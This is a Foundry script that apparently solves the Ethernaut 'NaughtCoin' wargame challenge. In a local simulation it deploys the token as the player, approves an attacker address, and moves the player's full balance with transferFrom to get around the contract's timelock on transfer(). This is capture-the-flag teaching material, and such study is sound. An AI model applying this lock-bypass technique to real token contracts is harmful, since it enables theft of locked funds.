// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";

import {NaughtCoin} from "../src/NaughtCoin.sol";

contract DeployNaughtCoin is Script {
    function run() external {
        address player = makeAddr("player");
        address attackAddress = makeAddr("AttackNaughtCoin");

        vm.prank(player);
        NaughtCoin nc = new NaughtCoin(player); // `player` deploys the contract
        vm.stopPrank(); // End the prank for deployment

        vm.prank(player); // Start a new prank for the approve() call
        bool approveSuccess = nc.approve(attackAddress, 1000000 * (10 ** 18));
        require(approveSuccess, "Approve failed");
        vm.stopPrank(); // Stop prank after approve

        console.log("NaughtCoin deployed at:", address(nc));
        uint256 playerBalanceBefore = nc.balanceOf(player);
        console.log("Player balance before:", playerBalanceBefore);

        vm.prank(attackAddress);
        bool successTransferFrom = nc.transferFrom(
            player,
            attackAddress,
            1000000 * (10 ** 18)
        );
        require(successTransferFrom, "Transfer failed");

        uint256 playerBalanceAfter = nc.balanceOf(player);
        console.log("Player balance after:", playerBalanceAfter);

        uint256 attackerBalance = nc.balanceOf(attackAddress);
        console.log("Attacker balance after:", attackerBalance);
        vm.stopPrank();
    }
}
